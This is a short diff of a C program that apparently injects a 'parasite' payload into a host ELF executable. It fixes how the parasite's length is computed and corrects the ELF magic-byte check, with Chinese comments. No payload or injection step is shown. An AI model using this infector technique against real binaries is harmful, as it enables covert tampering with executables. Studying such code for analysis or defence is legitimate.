@@ -61,7 +61,8 @@ int main(int argc, char **argv)
  	 
 	parasite_size = atoi(argv[2]);
 	host = argv[1];
-
+	//舍弃外部参数输入，直接sizeof计算
+	parasite_size = strlen(parasite);
 	printf("Length of parasite is %d bytes\n", parasite_size);
 	
 	if ((fd = open(argv[1], O_RDONLY)) == -1)
@@ -85,7 +86,7 @@ int main(int argc, char **argv)
 	
 	e_hdr = (Elf64_Ehdr *)mem;
 	//这里条件应该为||
- 	if (e_hdr->e_ident[0] != 0x7f || strcmp(&e_hdr->e_ident[1], "ELF"))
+ 	if (e_hdr->e_ident[0] != 0x7f || strncmp(&e_hdr->e_ident[1], "ELF", 3))
         {
                 printf("%s it not an elf file\n", argv[1]);
                 exit(-1);
